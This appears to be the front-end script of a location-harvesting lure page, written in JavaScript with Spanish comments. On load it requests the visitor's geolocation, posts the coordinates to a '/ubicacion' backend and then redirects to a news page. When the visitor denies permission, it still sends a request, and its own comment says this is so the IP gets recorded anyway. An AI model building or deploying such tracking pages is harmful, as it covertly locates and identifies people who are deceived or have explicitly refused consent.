// Ejecuta al cargar la página
window.addEventListener('DOMContentLoaded', () => {
    const estado = document.getElementById("estado");
  
    console.log("📦 script.js se está ejecutando");
  
    // Verifica si el navegador soporta geolocalización
    if (!navigator.geolocation) {
      console.warn("🌐 Geolocalización no soportada");
      if (estado) estado.innerText = "Tu navegador no soporta geolocalización.";
      return;
    }
  
    // Intenta obtener ubicación
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
  
        console.log(`🟢 Permiso concedido. Latitud: ${lat}, Longitud: ${lon}`);
  
        if (estado) estado.innerText = "Ubicación obtenida, redirigiendo...";
  
        // Enviar al backend
        fetch('/ubicacion', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ latitude: lat, longitude: lon })
        }).then(() => {
          // Redirige al contenido principal
          window.location.href = "noticia.html";
        }).catch(err => {
          console.error("❌ Error al enviar datos al backend:", err);
          if (estado) estado.innerText = "Error al enviar la ubicación.";
        });
      },
      (error) => {
        console.warn("❌ Acceso denegado o error al obtener ubicación:", error.message);
  
        if (estado) estado.innerText = "Esta función requiere acceso a tu ubicación.";
  
        // Aún así enviamos la IP al backend
        fetch('/ubicacion', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ latitude: null, longitude: null })
        }).then(() => {
          console.log("ℹ️ Solo se registró la IP (sin coordenadas)");
        }).catch(err => {
          console.error("❌ Error al enviar solo IP:", err);
        });
      }
    );
  });
  